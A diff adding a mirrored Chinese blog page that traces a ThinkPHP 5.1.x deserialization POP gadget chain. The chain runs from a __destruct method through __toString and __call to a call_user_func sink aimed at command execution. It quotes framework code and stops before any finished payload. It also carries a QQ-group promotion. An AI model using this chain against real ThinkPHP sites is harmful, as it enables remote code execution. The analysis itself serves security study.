@@ -1,0 +1,506 @@
+<html><head><meta charset='utf-8'><meta name='viewport' content='width=device-width, initial-scale=1'>
+<meta name='applicable-device' content='pc'><meta name='keywords' content='电脑,电脑讲解,电脑技术,编程,电脑故障维修ThinkPHP v5.1.x POP 链分析' />
+<script src='../../highlight/highlight.pack.js'></script>
+<link rel='stylesheet' type='text/css' href='../../highlight/styles/monokai.css'/>
+
+<link rel='stylesheet' href='../../fenxiang/dist/css/share.min.css'>
+<script src='../../fenxiang/src/js/social-share.js'></script>
+<script src='../../fenxiang/src/js/qrcode.js'></script>
+
+</head><body><script>hljs.initHighlightingOnLoad();</script><script>
+var system ={};
+var p = navigator.platform;       
+system.win = p.indexOf('Win') == 0;  
+system.mac = p.indexOf('Mac') == 0;  
+system.x11 = (p == 'X11') || (p.indexOf('Linux') == 0);     
+if(system.win||system.mac||system.xll){
+document.write("<link href='../css/3.css' rel='stylesheet' type='text/css'>");}else{ document.write("<link href='../css/3wap.css' rel='stylesheet' type='text/css'>");}</script><script src='../../js/3.js'></script><div class='div2'><div class='heading_nav'><ul><div><li><a href='../../index.html'>首页</a></li>
+</div><div onclick='hidden1()' >分享</div>
+</ul></div></div>
+<div id='heading_nav2'> 
+<li class='row' >
+<div class='social-share' data-mode='prepend'><a href='javascript:' class='social-share-icon icon-heart'></a></div></li></div><script charset='utf-8' src='../../3/js/hengfu.js'></script><script charset='utf-8' src='../../3/js/hengfu2.js'></script><hr><div class='div1'><div class='biaoti'><center>ThinkPHP v5.1.x POP 链分析</center></div><div class='banquan'>原文出处:本文由博客园博主程序媛的明天提供。<br/>
+原文连接:https://www.cnblogs.com/a609251438/p/11831735.html</div><br>
+    <p>环境：MacOS 10.13 MAMAP Prophp 7.0.33 + xdebugVisual Studio Code前言我所理解的 POP Chain：利用魔术方法并巧妙构造特殊属性调用一系列函数或类方法以执行某种敏感操作的调用堆栈反序列化常用魔法函数<br /><br /><br /><strong>前言</strong><br />我所理解的 POP Chain：<br />利用魔术方法并巧妙构造特殊属性调用一系列函数或类方法以执行某种敏感操作的调用堆栈<br /><br /><strong>反序列化常用魔法函数</strong></p>
+<ol class="linenums">
+<li class="L0">
+<src class="cnblogs_code">
+<pre><code><span style="color: #008080;"> 1</span> __wakeup， <span style="color: #008080;">unserialize</span><span style="color: #000000;">() 执行前调用
+</span><span style="color: #008080;"> 2</span> <span style="color: #000000;">__destruct， 对销毁的时候调用
+</span><span style="color: #008080;"> 3</span> <span style="color: #000000;">__toString， 类被当成字符串时的回应方法
+</span><span style="color: #008080;"> 4</span> __construct()，当对象创建(<span style="color: #0000ff;">new</span><span style="color: #000000;">)时会自动调用，注意在
+</span><span style="color: #008080;"> 5</span> <span style="color: #008080;">unserialize</span><span style="color: #000000;">()时并不会自动调用
+</span><span style="color: #008080;"> 6</span> __sleep()，<span style="color: #008080;">serialize</span><span style="color: #000000;">()时会先被调用
+</span><span style="color: #008080;"> 7</span> <span style="color: #000000;">__call()，在对象中调用一个不可访问方法时调用
+</span><span style="color: #008080;"> 8</span> <span style="color: #000000;">__callStatic()，用静态方式中调用一个不可访问方法时调用
+</span><span style="color: #008080;"> 9</span> <span style="color: #000000;">__get()，获得一个类的成员变量时调用
+</span><span style="color: #008080;">10</span> <span style="color: #000000;">__set()，设置一个类的成员变量时调用
+</span><span style="color: #008080;">11</span> <span style="color: #000000;">__isset()，当对不可访问属性调用isset()或empty()时调用
+</span><span style="color: #008080;">12</span> <span style="color: #000000;">__unset()，当对不可访问属性调用unset()时被调用。
+</span><span style="color: #008080;">13</span> <span style="color: #000000;">__wakeup()，执行unserialize()时，先会调用这个函数
+</span><span style="color: #008080;">14</span> <span style="color: #000000;">__toString()，类被当成字符串时的回应方法
+</span><span style="color: #008080;">15</span> <span style="color: #000000;">__invoke()，调用函数的方式调用一个对象时的回应方法
+</span><span style="color: #008080;">16</span> <span style="color: #000000;">__set_state()，调用var_export()导出类时，此静态方法会被调用。
+</span><span style="color: #008080;">17</span> <span style="color: #000000;">__clone()，当对象复制完成时调用
+</span><span style="color: #008080;">18</span> <span style="color: #000000;">__autoload()，尝试加载未定义的类
+</span><span style="color: #008080;">19</span> __debugInfo()，打印所需调试信息</code></pre>
+
+<p>&nbsp;</p>
+</li>
+</ol>
+<src class="think-copy">&nbsp;
+<p> phar 文件通过 phar:// 伪协议拓宽攻击面 因为 phar 文件会以序列化的形式存储用户自定义的meta-data，所以在文件系统函数（file_exists()、is_dir()等）参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作,深入了解请至：<a href="https://paper.seebug.org/680/" target="_blank">https://paper.seebug.org/680/</a><br /><br />如果对反序列化没有了解的话建议先学习下相关内容ThinkPHP v5.1.x POP 链分析安装这里使用的是官方 ThinkPHP V5.1.38composer 部署composer create-project topthink/think=5.1.38 tp5.1.38利用链全局搜索函数 __destruct<br /><br />来到 /thinkphp/library/think/process/pipes/Windows.php</p>
+<ol class="linenums">
+<li class="L0">
+<src class="cnblogs_code">
+<pre><code><span style="color: #008080;"> 1</span> <span style="color: #0000ff;">public</span> <span style="color: #0000ff;">function</span><span style="color: #000000;"> __destruct()
+</span><span style="color: #008080;"> 2</span> <span style="color: #000000;">    {
+</span><span style="color: #008080;"> 3</span>         <span style="color: #800080;">$this</span>-&gt;<span style="color: #000000;">close();
+</span><span style="color: #008080;"> 4</span>         <span style="color: #800080;">$this</span>-&gt;<span style="color: #000000;">removeFiles();
+</span><span style="color: #008080;"> 5</span> <span style="color: #000000;">    }
+</span><span style="color: #008080;"> 6</span>     . . .  . . . 
+<span style="color: #008080;"> 7</span>     <span style="color: #008000;">/*</span><span style="color: #008000;">*
+</span><span style="color: #008080;"> 8</span> <span style="color: #008000;">     * 删除临时文件
+</span><span style="color: #008080;"> 9</span>      <span style="color: #008000;">*/</span>
+<span style="color: #008080;">10</span>     <span style="color: #0000ff;">private</span> <span style="color: #0000ff;">function</span><span style="color: #000000;"> removeFiles()
+</span><span style="color: #008080;">11</span> <span style="color: #000000;">    {
+</span><span style="color: #008080;">12</span>         <span style="color: #0000ff;">foreach</span> (<span style="color: #800080;">$this</span>-&gt;files <span style="color: #0000ff;">as</span> <span style="color: #800080;">$filename</span><span style="color: #000000;">) {
+</span><span style="color: #008080;">13</span>             <span style="color: #0000ff;">if</span> (<span style="color: #008080;">file_exists</span>(<span style="color: #800080;">$filename</span><span style="color: #000000;">)) {
+</span><span style="color: #008080;">14</span>                 @<span style="color: #008080;">unlink</span>(<span style="color: #800080;">$filename</span><span style="color: #000000;">);
+</span><span style="color: #008080;">15</span> <span style="color: #000000;">            }
+</span><span style="color: #008080;">16</span> <span style="color: #000000;">        }
+</span><span style="color: #008080;">17</span>         <span style="color: #800080;">$this</span>-&gt;files =<span style="color: #000000;"> [];
+</span><span style="color: #008080;">18</span>     }</code></pre>
+
+<p>&nbsp;</p>
+</li>
+</ol>
+<src class="think-copy">&nbsp;
+<p>看下 file_exists 的描述f</p>
+<ol class="linenums">
+<li class="L0">
+<src class="cnblogs_code">
+<pre><code><span style="color: #008080;">1</span> ile_exists ( <span style="color: #0000ff;">string</span> <span style="color: #800080;">$filename</span> ) </code></pre>
+
+</li>
+</ol>
+<src class="think-copy">复制代码
+<p> : bool如果传入的 $filename 是个反序列化的对象，在被 file_exists 当作字符串处理的时候就会触发其 __toString 方法（如果有的话）所以下面就是找含 __toString 方法的类<br /><br />来到 /thinkphp/library/think/model/concern/Conversion.php</p>
+<ol class="linenums">
+<li class="L0">
+<src class="cnblogs_code">
+<pre><code><span style="color: #008080;">1</span> <span style="color: #0000ff;">public</span> <span style="color: #0000ff;">function</span> toJson(<span style="color: #800080;">$options</span> =<span style="color: #000000;"> JSON_UNESCAPED_UNICODE)
+</span><span style="color: #008080;">2</span> <span style="color: #000000;">    {
+</span><span style="color: #008080;">3</span>         <span style="color: #0000ff;">return</span> json_encode(<span style="color: #800080;">$this</span>-&gt;toArray(), <span style="color: #800080;">$options</span><span style="color: #000000;">);
+</span><span style="color: #008080;">4</span> <span style="color: #000000;">    }
+</span><span style="color: #008080;">5</span>     . . .   . . . 
+<span style="color: #008080;">6</span>     <span style="color: #0000ff;">public</span> <span style="color: #0000ff;">function</span><span style="color: #000000;"> __toString()
+</span><span style="color: #008080;">7</span> <span style="color: #000000;">    {
+</span><span style="color: #008080;">8</span>         <span style="color: #0000ff;">return</span> <span style="color: #800080;">$this</span>-&gt;<span style="color: #000000;">toJson();
+</span><span style="color: #008080;">9</span>     }</code></pre>
+
+<p>&nbsp;</p>
+</li>
+</ol>
+<src class="think-copy">&nbsp;
+<p> 可以看到，在 toJson() 函数中又调用了 toArray() 函数如果 toArray() 函数中存在并使用某个可控变量的方法，那么我们就可以利用这点去触发其他类的 __call 方法下面是 toArray() 函数的定义，$this-&gt;append 作为类属性是可控的，所以 $relation 和 $name 也就可控了，于是 $relation-&gt;visible($name); 就成了这个 POP 链中的中间跳板<br /><br />phper在进阶的时候总会遇到一些问题和瓶颈，业务代码写多了没有方向感，不知道该从那里入手去提升，对此我整理了一些资料，包括但不限于：分布式架构、高可扩展、高性能、高并发、服务器性能调优、TP6，laravel，YII2，Redis，Swoole、Kafka、Mysql优化、shell脚本、Docker、微服务、Nginx等多个知识点高级进阶干货需要的可以免费分享给大家，需要的（点击&rarr;）我的官方群677079770<a href="https://jq.qq.com/?_wv=1027&amp;k=5BoEMVl" target="_blank">https://jq.qq.com/?_wv=1027&amp;k=5BoEMVl</a></p>
+<ol class="linenums">
+<li class="L0">
+<src class="cnblogs_code">
+<pre><code><span style="color: #008080;"> 1</span> <span style="color: #0000ff;">public</span> <span style="color: #0000ff;">function</span><span style="color: #000000;"> toArray()
+</span><span style="color: #008080;"> 2</span> <span style="color: #000000;">{
+</span><span style="color: #008080;"> 3</span>     <span style="color: #800080;">$item</span>       =<span style="color: #000000;"> [];
+</span><span style="color: #008080;"> 4</span>     <span style="color: #800080;">$hasVisible</span> = <span style="color: #0000ff;">false</span><span style="color: #000000;">;
+</span><span style="color: #008080;"> 5</span>     . . .   . . .
+<span style="color: #008080;"> 6</span>     <span style="color: #008000;">//</span><span style="color: #008000;"> 追加属性（必须定义获取器）</span>
+<span style="color: #008080;"> 7</span>     <span style="color: #0000ff;">if</span> (!<span style="color: #0000ff;">empty</span>(<span style="color: #800080;">$this</span>-&gt;<span style="color: #000000;">append)) {
+</span><span style="color: #008080;"> 8</span>         <span style="color: #0000ff;">foreach</span> (<span style="color: #800080;">$this</span>-&gt;append <span style="color: #0000ff;">as</span> <span style="color: #800080;">$key</span> =&gt; <span style="color: #800080;">$name</span><span style="color: #000000;">) {
+</span><span style="color: #008080;"> 9</span>             <span style="color: #0000ff;">if</span> (<span style="color: #008080;">is_array</span>(<span style="color: #800080;">$name</span><span style="color: #000000;">)) {
+</span><span style="color: #008080;">10</span>                 <span style="color: #008000;">//</span><span style="color: #008000;"> 追加关联对象属性</span>
+<span style="color: #008080;">11</span>                 <span style="color: #800080;">$relation</span> = <span style="color: #800080;">$this</span>-&gt;getRelation(<span style="color: #800080;">$key</span><span style="color: #000000;">);
+</span><span style="color: #008080;">12</span>                 <span style="color: #0000ff;">if</span> (!<span style="color: #800080;">$relation</span><span style="color: #000000;">) {
+</span><span style="color: #008080;">13</span>                     <span style="color: #800080;">$relation</span> = <span style="color: #800080;">$this</span>-&gt;getAttr(<span style="color: #800080;">$key</span><span style="color: #000000;">);
+</span><span style="color: #008080;">14</span>                     <span style="color: #0000ff;">if</span> (<span style="color: #800080;">$relation</span><span style="color: #000000;">) {
+</span><span style="color: #008080;">15</span>                         <span style="color: #800080;">$relation</span>-&gt;visible(<span style="color: #800080;">$name</span><span style="color: #000000;">);
+</span><span style="color: #008080;">16</span> <span style="color: #000000;">                    }
+</span><span style="color: #008080;">17</span> <span style="color: #000000;">                }
+</span><span style="color: #008080;">18</span>                 <span style="color: #800080;">$item</span>[<span style="color: #800080;">$key</span>] = <span style="color: #800080;">$relation</span> ? <span style="color: #800080;">$relation</span>-&gt;append(<span style="color: #800080;">$name</span>)-&gt;toArray() :<span style="color: #000000;"> [];
+</span><span style="color: #008080;">19</span>             } <span style="color: #0000ff;">elseif</span> (<span style="color: #008080;">strpos</span>(<span style="color: #800080;">$name</span>, '.'<span style="color: #000000;">)) {
+</span><span style="color: #008080;">20</span>            . . .   . . .   
+<span style="color: #008080;">21</span>             } <span style="color: #0000ff;">else</span><span style="color: #000000;"> {
+</span><span style="color: #008080;">22</span>                 <span style="color: #800080;">$item</span>[<span style="color: #800080;">$name</span>] = <span style="color: #800080;">$this</span>-&gt;getAttr(<span style="color: #800080;">$name</span>, <span style="color: #800080;">$item</span><span style="color: #000000;">);
+</span><span style="color: #008080;">23</span> <span style="color: #000000;">            }
+</span><span style="color: #008080;">24</span> <span style="color: #000000;">        }
+</span><span style="color: #008080;">25</span> <span style="color: #000000;">    }
+</span><span style="color: #008080;">26</span>     <span style="color: #0000ff;">return</span> <span style="color: #800080;">$item</span><span style="color: #000000;">;
+</span><span style="color: #008080;">27</span> }</code></pre>
+
+<p>&nbsp;</p>
+</li>
+</ol>
+<src class="think-copy">&nbsp;
+<p> 那我们在这里应该传入怎么样的值以及什么数据呢，先看下 $relation 是如何处理得到的<br /><br />跟进 getRelation，在 /thinkphp/library/think/model/concern/RelationShip.php 中找到函数定义</p>
+<ol class="linenums">
+<li class="L0">
+<src class="cnblogs_code">
+<pre><code><span style="color: #008080;"> 1</span> <span style="color: #000000;">trait RelationShip
+</span><span style="color: #008080;"> 2</span> <span style="color: #000000;">{
+</span><span style="color: #008080;"> 3</span>     . . .   . . . 
+<span style="color: #008080;"> 4</span>     <span style="color: #008000;">/*</span><span style="color: #008000;">*
+</span><span style="color: #008080;"> 5</span> <span style="color: #008000;">     * 获取当前模型的关联模型数据
+</span><span style="color: #008080;"> 6</span> <span style="color: #008000;">     * @access public
+</span><span style="color: #008080;"> 7</span> <span style="color: #008000;">     * @param  string $name 关联方法名
+</span><span style="color: #008080;"> 8</span> <span style="color: #008000;">     * @return mixed
+</span><span style="color: #008080;"> 9</span>      <span style="color: #008000;">*/</span>
+<span style="color: #008080;">10</span>     <span style="color: #0000ff;">public</span> <span style="color: #0000ff;">function</span> getRelation(<span style="color: #800080;">$name</span> = <span style="color: #0000ff;">null</span><span style="color: #000000;">)
+</span><span style="color: #008080;">11</span> <span style="color: #000000;">    {
+</span><span style="color: #008080;">12</span>         <span style="color: #0000ff;">if</span> (<span style="color: #008080;">is_null</span>(<span style="color: #800080;">$name</span><span style="color: #000000;">)) {
+</span><span style="color: #008080;">13</span>             <span style="color: #0000ff;">return</span> <span style="color: #800080;">$this</span>-&gt;<span style="color: #000000;">relation;
+</span><span style="color: #008080;">14</span>         } <span style="color: #0000ff;">elseif</span> (<span style="color: #008080;">array_key_exists</span>(<span style="color: #800080;">$name</span>, <span style="color: #800080;">$this</span>-&gt;<span style="color: #000000;">relation)) {
+</span><span style="color: #008080;">15</span>             <span style="color: #0000ff;">return</span> <span style="color: #800080;">$this</span>-&gt;relation[<span style="color: #800080;">$name</span><span style="color: #000000;">];
+</span><span style="color: #008080;">16</span> <span style="color: #000000;">        }
+</span><span style="color: #008080;">17</span>         <span style="color: #0000ff;">return</span><span style="color: #000000;">;
+</span><span style="color: #008080;">18</span> <span style="color: #000000;">    }
+</span><span style="color: #008080;">19</span>     . . .   . . . 
+<span style="color: #008080;">20</span> }</code></pre>
+
+<p>&nbsp;</p>
+</li>
+</ol>
+<src class="think-copy">&nbsp;
+<p>由于 getRelation 最终都会 return; 导致返回 NULL，所以 下面的 if (!$relation) 一定成立所以直接跟进后面的 getAttr，在 /thinkphp/library/think/model/concern/Attribute.php 找到其定义</p>
+<ol class="linenums">
+<li class="L0">
+<src class="cnblogs_code">
+<pre><code><span style="color: #008080;"> 1</span> <span style="color: #000000;">trait Attribute
+</span><span style="color: #008080;"> 2</span> <span style="color: #000000;">{
+</span><span style="color: #008080;"> 3</span>     . . .   . . .
+<span style="color: #008080;"> 4</span>     <span style="color: #0000ff;">public</span> <span style="color: #0000ff;">function</span> getData(<span style="color: #800080;">$name</span> = <span style="color: #0000ff;">null</span><span style="color: #000000;">)
+</span><span style="color: #008080;"> 5</span> <span style="color: #000000;">    {
+</span><span style="color: #008080;"> 6</span>         <span style="color: #0000ff;">if</span> (<span style="color: #008080;">is_null</span>(<span style="color: #800080;">$name</span><span style="color: #000000;">)) {
+</span><span style="color: #008080;"> 7</span>             <span style="color: #0000ff;">return</span> <span style="color: #800080;">$this</span>-&gt;<span style="color: #000000;">data;
+</span><span style="color: #008080;"> 8</span>         } <span style="color: #0000ff;">elseif</span> (<span style="color: #008080;">array_key_exists</span>(<span style="color: #800080;">$name</span>, <span style="color: #800080;">$this</span>-&gt;<span style="color: #000000;">data)) {
+</span><span style="color: #008080;"> 9</span>             <span style="color: #0000ff;">return</span> <span style="color: #800080;">$this</span>-&gt;data[<span style="color: #800080;">$name</span><span style="color: #000000;">];
+</span><span style="color: #008080;">10</span>         } <span style="color: #0000ff;">elseif</span> (<span style="color: #008080;">array_key_exists</span>(<span style="color: #800080;">$name</span>, <span style="color: #800080;">$this</span>-&gt;<span style="color: #000000;">relation)) {
+</span><span style="color: #008080;">11</span>             <span style="color: #0000ff;">return</span> <span style="color: #800080;">$this</span>-&gt;relation[<span style="color: #800080;">$name</span><span style="color: #000000;">];
+</span><span style="color: #008080;">12</span> <span style="color: #000000;">        }
+</span><span style="color: #008080;">13</span>         <span style="color: #0000ff;">throw</span> <span style="color: #0000ff;">new</span> InvalidArgumentException('property not exists:' . <span style="color: #0000ff;">static</span>::<span style="color: #0000ff;">class</span> . '-&gt;' . <span style="color: #800080;">$name</span><span style="color: #000000;">);
+</span><span style="color: #008080;">14</span> <span style="color: #000000;">    }
+</span><span style="color: #008080;">15</span>     . . .   . . . 
+<span style="color: #008080;">16</span>     <span style="color: #0000ff;">public</span> <span style="color: #0000ff;">function</span> getAttr(<span style="color: #800080;">$name</span>, &amp;<span style="color: #800080;">$item</span> = <span style="color: #0000ff;">null</span><span style="color: #000000;">)
+</span><span style="color: #008080;">17</span> <span style="color: #000000;">    {
+</span><span style="color: #008080;">18</span>         <span style="color: #0000ff;">try</span><span style="color: #000000;"> {
+</span><span style="color: #008080;">19</span>             <span style="color: #800080;">$notFound</span> = <span style="color: #0000ff;">false</span><span style="color: #000000;">;
+</span><span style="color: #008080;">20</span>             <span style="color: #800080;">$value</span>    = <span style="color: #800080;">$this</span>-&gt;getData(<span style="color: #800080;">$name</span><span style="color: #000000;">);
+</span><span style="color: #008080;">21</span>         } <span style="color: #0000ff;">catch</span> (InvalidArgumentException <span style="color: #800080;">$e</span><span style="color: #000000;">) {
+</span><span style="color: #008080;">22</span>             <span style="color: #800080;">$notFound</span> = <span style="color: #0000ff;">true</span><span style="color: #000000;">;
+</span><span style="color: #008080;">23</span>             <span style="color: #800080;">$value</span>    = <span style="color: #0000ff;">null</span><span style="color: #000000;">;
+</span><span style="color: #008080;">24</span> <span style="color: #000000;">        }
+</span><span style="color: #008080;">25</span>         . . .  . . . 
+<span style="color: #008080;">26</span> <span style="color: #000000;">    }
+</span><span style="color: #008080;">27</span> }</code></pre>
+
+<p>&nbsp;</p>
+</li>
+</ol>
+<p> 从 getAttr ---&gt; getData 返回 data 数组中同名键值的元素值，即 $relation &lt;---- $this-&gt;data[$name]，我们需要的 $data 和 $append 分别位于 Attribute 和 Conversion，且两者都是 trait 类型Trait 可以说是和 Class 相似，是 PHP 5.4.0 开始实现的一种代码复用的方法，可以使用 use 加载<br /><br />详情可以看官方手册 PHP: Trait - Manual<br /><br />所以接下来是寻找一个同时使用了 Attribute 和 Conversion 的类<br /><br />发现只有 /thinkphp/library/think/Model.php 满足条件</p>
+<ol class="linenums">
+<li class="L0">
+<src class="cnblogs_code">
+<pre><code><span style="color: #008080;">1</span> <span style="color: #0000ff;">abstract</span> <span style="color: #0000ff;">class</span> Model <span style="color: #0000ff;">implements</span> \JsonSerializable,<span style="color: #000000;"> \ArrayAccess
+</span><span style="color: #008080;">2</span> <span style="color: #000000;">{
+</span><span style="color: #008080;">3</span>     <span style="color: #0000ff;">use</span><span style="color: #000000;"> model\concern\Attribute;
+</span><span style="color: #008080;">4</span>     <span style="color: #0000ff;">use</span><span style="color: #000000;"> model\concern\RelationShip;
+</span><span style="color: #008080;">5</span>     <span style="color: #0000ff;">use</span><span style="color: #000000;"> model\concern\ModelEvent;
+</span><span style="color: #008080;">6</span>     <span style="color: #0000ff;">use</span><span style="color: #000000;"> model\concern\TimeStamp;
+</span><span style="color: #008080;">7</span>     <span style="color: #0000ff;">use</span><span style="color: #000000;"> model\concern\Conversion;
+</span><span style="color: #008080;">8</span>     . . .   . . .
+<span style="color: #008080;">9</span> }</code></pre>
+
+<p>&nbsp;</p>
+</li>
+</ol>
+<p>下面就需要找到一个没有 visible 方法却有 __call 方法的类作为执行点找到 /thinkphp/library/think/Request.php 中的 Request 类</p>
+<ol class="linenums">
+<li class="L0">
+<src class="cnblogs_code">
+<pre><code><span style="color: #008080;"> 1</span> <span style="color: #0000ff;">class</span><span style="color: #000000;"> Request
+</span><span style="color: #008080;"> 2</span> <span style="color: #000000;">{
+</span><span style="color: #008080;"> 3</span>     . . .   . . . 
+<span style="color: #008080;"> 4</span>     <span style="color: #008000;">/*</span><span style="color: #008000;">*
+</span><span style="color: #008080;"> 5</span> <span style="color: #008000;">     * 扩展方法
+</span><span style="color: #008080;"> 6</span> <span style="color: #008000;">     * @var array
+</span><span style="color: #008080;"> 7</span>      <span style="color: #008000;">*/</span>
+<span style="color: #008080;"> 8</span>     <span style="color: #0000ff;">protected</span> <span style="color: #800080;">$hook</span> =<span style="color: #000000;"> [];
+</span><span style="color: #008080;"> 9</span>     . . .   . . . 
+<span style="color: #008080;">10</span>     <span style="color: #0000ff;">public</span> <span style="color: #0000ff;">function</span> __call(<span style="color: #800080;">$method</span>, <span style="color: #800080;">$args</span><span style="color: #000000;">)
+</span><span style="color: #008080;">11</span> <span style="color: #000000;">    {
+</span><span style="color: #008080;">12</span>         <span style="color: #0000ff;">if</span> (<span style="color: #008080;">array_key_exists</span>(<span style="color: #800080;">$method</span>, <span style="color: #800080;">$this</span>-&gt;<span style="color: #000000;">hook)) {
+</span><span style="color: #008080;">13</span>             <span style="color: #008080;">array_unshift</span>(<span style="color: #800080;">$args</span>, <span style="color: #800080;">$this</span><span style="color: #000000;">);
+</span><span style="color: #008080;">14</span>             <span style="color: #0000ff;">return</span> <span style="color: #008080;">call_user_func_array</span>(<span style="color: #800080;">$this</span>-&gt;hook[<span style="color: #800080;">$method</span>], <span style="color: #800080;">$args</span><span style="color: #000000;">);
+</span><span style="color: #008080;">15</span> <span style="color: #000000;">        }
+</span><span style="color: #008080;">16</span>         <span style="color: #0000ff;">throw</span> <span style="color: #0000ff;">new</span> <span style="color: #0000ff;">Exception</span>('method not exists:' . <span style="color: #0000ff;">static</span>::<span style="color: #0000ff;">class</span> . '-&gt;' . <span style="color: #800080;">$method</span><span style="color: #000000;">);
+</span><span style="color: #008080;">17</span> <span style="color: #000000;">    }
+</span><span style="color: #008080;">18</span>     . . .   . . .
+<span style="color: #008080;">19</span> }</code></pre>
+
+<p>&nbsp;</p>
+</li>
+</ol>
+<p>这里的回调参数来源于 $hook 数组，而且方法名和参数都是可控的，不过 array_unshift 函数会把若干元素前置到数组的开头</p>
+<ol class="linenums">
+<li class="L0">
+<src class="cnblogs_code">
+<pre><code><span style="color: #008080;"> 1</span>  <span style="color: #800080;">$queue</span> = <span style="color: #0000ff;">array</span>("orange", "banana"<span style="color: #000000;">);
+</span><span style="color: #008080;"> 2</span> <span style="color: #008080;">array_unshift</span>(<span style="color: #800080;">$queue</span>, "apple", "raspberry"<span style="color: #000000;">);
+</span><span style="color: #008080;"> 3</span> <span style="color: #008080;">print_r</span>(<span style="color: #800080;">$queue</span><span style="color: #000000;">);
+</span><span style="color: #008080;"> 4</span> <span style="color: #008000;">//</span><span style="color: #008000;">/</span>
+<span style="color: #008080;"> 5</span> <span style="color: #0000ff;">Array</span>
+<span style="color: #008080;"> 6</span> <span style="color: #000000;">(
+</span><span style="color: #008080;"> 7</span>     [0] =&gt;<span style="color: #000000;"> apple
+</span><span style="color: #008080;"> 8</span>     [1] =&gt;<span style="color: #000000;"> raspberry
+</span><span style="color: #008080;"> 9</span>     [2] =&gt;<span style="color: #000000;"> orange
+</span><span style="color: #008080;">10</span>     [3] =&gt;<span style="color: #000000;"> banana
+</span><span style="color: #008080;">11</span> )</code></pre>
+
+<p>&nbsp;</p>
+</li>
+</ol>
+<p>这样的话明显就很难执行命令了，因为参数数组的第一个元素始终是 $this，无法直接执行我们想要的命令， 需要其他某种对参数不是这么敏感的函数作为一个新的执行点或者跳板Request 类中有一个 filterValue 函数具有过滤功能，寻找调用 filterValue 的地方以便控制 $value 和 $filters 好执行命令</p>
+<ol class="linenums">
+<li class="L0">
+<src class="cnblogs_code">
+<pre><code><span style="color: #008080;"> 1</span> <span style="color: #0000ff;">private</span> <span style="color: #0000ff;">function</span> filterValue(&amp;<span style="color: #800080;">$value</span>, <span style="color: #800080;">$key</span>, <span style="color: #800080;">$filters</span><span style="color: #000000;">)
+</span><span style="color: #008080;"> 2</span> <span style="color: #000000;">    {
+</span><span style="color: #008080;"> 3</span>         <span style="color: #800080;">$default</span> = <span style="color: #008080;">array_pop</span>(<span style="color: #800080;">$filters</span><span style="color: #000000;">);
+</span><span style="color: #008080;"> 4</span>         <span style="color: #0000ff;">foreach</span> (<span style="color: #800080;">$filters</span> <span style="color: #0000ff;">as</span> <span style="color: #800080;">$filter</span><span style="color: #000000;">) {
+</span><span style="color: #008080;"> 5</span>             <span style="color: #0000ff;">if</span> (<span style="color: #008080;">is_callable</span>(<span style="color: #800080;">$filter</span><span style="color: #000000;">)) {
+</span><span style="color: #008080;"> 6</span>                 <span style="color: #008000;">//</span><span style="color: #008000;"> 调用函数或者方法过滤</span>
+<span style="color: #008080;"> 7</span>                 <span style="color: #800080;">$value</span> = <span style="color: #008080;">call_user_func</span>(<span style="color: #800080;">$filter</span>, <span style="color: #800080;">$value</span><span style="color: #000000;">);
+</span><span style="color: #008080;"> 8</span>             } <span style="color: #0000ff;">elseif</span> (<span style="color: #008080;">is_scalar</span>(<span style="color: #800080;">$value</span><span style="color: #000000;">)) {
+</span><span style="color: #008080;"> 9</span>              . . .   . . .         
+<span style="color: #008080;">10</span> <span style="color: #000000;">             }
+</span><span style="color: #008080;">11</span>         <span style="color: #0000ff;">return</span> <span style="color: #800080;">$value</span><span style="color: #000000;">;
+</span><span style="color: #008080;">12</span>     }</code></pre>
+
+<p>&nbsp;</p>
+</li>
+</ol>
+<p>Request 类中的 input 函数由 array_walk_recursive 调用了 filterValue，但是参数仍不可控，再往上寻找调用点看看</p>
+<ol class="linenums">
+<li class="L0">
+<src class="cnblogs_code">
+<pre><code><span style="color: #008080;"> 1</span> <span style="color: #0000ff;">public</span> <span style="color: #0000ff;">function</span> input(<span style="color: #800080;">$data</span> = [], <span style="color: #800080;">$name</span> = '', <span style="color: #800080;">$default</span> = <span style="color: #0000ff;">null</span>, <span style="color: #800080;">$filter</span> = ''<span style="color: #000000;">)
+</span><span style="color: #008080;"> 2</span> <span style="color: #000000;">    {
+</span><span style="color: #008080;"> 3</span>         <span style="color: #0000ff;">if</span> (<span style="color: #0000ff;">false</span> === <span style="color: #800080;">$name</span><span style="color: #000000;">) {
+</span><span style="color: #008080;"> 4</span>             <span style="color: #008000;">//</span><span style="color: #008000;"> 获取原始数据</span>
+<span style="color: #008080;"> 5</span>             <span style="color: #0000ff;">return</span> <span style="color: #800080;">$data</span><span style="color: #000000;">;
+</span><span style="color: #008080;"> 6</span> <span style="color: #000000;">        }
+</span><span style="color: #008080;"> 7</span>         <span style="color: #800080;">$name</span> = (<span style="color: #0000ff;">string</span>) <span style="color: #800080;">$name</span><span style="color: #000000;">;
+</span><span style="color: #008080;"> 8</span>         <span style="color: #0000ff;">if</span> ('' != <span style="color: #800080;">$name</span><span style="color: #000000;">) {
+</span><span style="color: #008080;"> 9</span>             <span style="color: #008000;">//</span><span style="color: #008000;"> 解析name</span>
+<span style="color: #008080;">10</span>             <span style="color: #0000ff;">if</span> (<span style="color: #008080;">strpos</span>(<span style="color: #800080;">$name</span>, '/'<span style="color: #000000;">)) {
+</span><span style="color: #008080;">11</span>                 <span style="color: #0000ff;">list</span>(<span style="color: #800080;">$name</span>, <span style="color: #800080;">$type</span>) = <span style="color: #008080;">explode</span>('/', <span style="color: #800080;">$name</span><span style="color: #000000;">);
+</span><span style="color: #008080;">12</span> <span style="color: #000000;">            }
+</span><span style="color: #008080;">13</span>             <span style="color: #800080;">$data</span> = <span style="color: #800080;">$this</span>-&gt;getData(<span style="color: #800080;">$data</span>, <span style="color: #800080;">$name</span><span style="color: #000000;">);
+</span><span style="color: #008080;">14</span>             <span style="color: #0000ff;">if</span> (<span style="color: #008080;">is_null</span>(<span style="color: #800080;">$data</span><span style="color: #000000;">)) {
+</span><span style="color: #008080;">15</span>                 <span style="color: #0000ff;">return</span> <span style="color: #800080;">$default</span><span style="color: #000000;">;
+</span><span style="color: #008080;">16</span> <span style="color: #000000;">            }
+</span><span style="color: #008080;">17</span>             <span style="color: #0000ff;">if</span> (<span style="color: #008080;">is_object</span>(<span style="color: #800080;">$data</span><span style="color: #000000;">)) {
+</span><span style="color: #008080;">18</span>                 <span style="color: #0000ff;">return</span> <span style="color: #800080;">$data</span><span style="color: #000000;">;
+</span><span style="color: #008080;">19</span> <span style="color: #000000;">            }
+</span><span style="color: #008080;">20</span> <span style="color: #000000;">        }
